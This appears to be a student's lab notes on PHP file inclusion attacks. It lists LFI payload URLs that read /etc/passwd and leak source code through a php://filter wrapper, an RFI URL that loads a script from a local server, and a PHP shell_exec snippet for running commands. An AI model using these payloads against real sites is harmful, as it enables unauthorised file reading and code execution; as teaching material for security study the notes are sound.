# File Inclusion Vulnerabilities

This lab focuses on how to exploit with file inclusion. In the assignment for this we created a php server. Using this, were were able to pass commands and traverse through directories.

#### **LFI**

**Helpful Commands:**

**Traversing to a file**

```
http://example.com/index.php?page=../../../etc/passwd
```

```
http://example.com/index.php?page=/etc/passwd
```

Displaying source code of index.php

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

\*\* This will be in base64, use cyberchef to decode

#### RFI

```
http://example.com/index.php?page=http://127.0.0.1:8000/rfi.php
```

This is only possible if the php config allows remote urls.

#### PHP Server Commands

Setting up a server

```
php -S 127.0.0.1:9000
```

allow_\_url\_include must be on in the config for RFI._

Executing commands on php

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

```php
<?php
$output = shell_exec('ls -als');
echo "<pre>$output</pre>";
?>
```
